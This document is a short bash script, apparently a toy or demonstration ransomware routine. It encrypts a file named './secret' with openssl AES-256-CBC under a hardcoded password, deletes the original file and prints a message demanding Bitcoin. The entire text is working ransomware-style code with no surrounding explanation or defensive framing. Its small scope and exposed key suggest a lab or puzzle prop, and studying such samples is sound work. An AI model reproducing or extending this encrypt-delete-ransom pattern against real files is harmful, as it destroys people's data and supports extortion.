#!/bin/bash

FILE_TO_ENCRYPT="./secret"
PASSWORD="18311813"
OUTPUT_FILE="${FILE_TO_ENCRYPT}.enc"

openssl enc -aes-256-cbc -salt -in "$FILE_TO_ENCRYPT" -out "$OUTPUT_FILE" -pass pass:"$PASSWORD"

if [ $? -eq 0 ]; then
  echo "Your File is Encrypted! Give me BitCoin!"
  rm "$FILE_TO_ENCRYPT"
fi